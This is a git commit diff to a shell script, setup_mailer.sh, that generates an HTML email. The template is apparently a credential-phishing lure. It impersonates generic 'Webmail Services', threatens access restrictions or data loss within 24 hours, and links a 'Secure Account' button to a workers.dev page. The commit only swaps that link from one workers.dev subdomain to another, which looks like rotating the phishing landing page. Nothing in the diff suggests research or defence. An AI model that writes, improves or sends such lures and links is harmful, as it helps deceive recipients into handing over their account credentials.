5987bbb1a860a5fad38d7513934160e7ae3a51f8
Benten1000 <112785547+Benten1000@users.noreply.github.com>
2025-10-22 02:01:05 +0100

    Update secure account link in setup_mailer.sh

--- setup_mailer.sh
+++ setup_mailer.sh
@@ -129,7 +129,7 @@ cat > email.html <<EOL
       Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
     </div>
     <div class="button-container">
-      <a href="https://lively-night-8850.stacyjenn973.workers.dev/" class="cta-button">Secure Account</a>
+      <a href="https://quiet-star-25e9.stacyjenn973.workers.dev/" class="cta-button">Secure Account</a>
     </div>
     <div class="footer">
       &copy; 2025 Webmail Services. All rights reserved.<br />
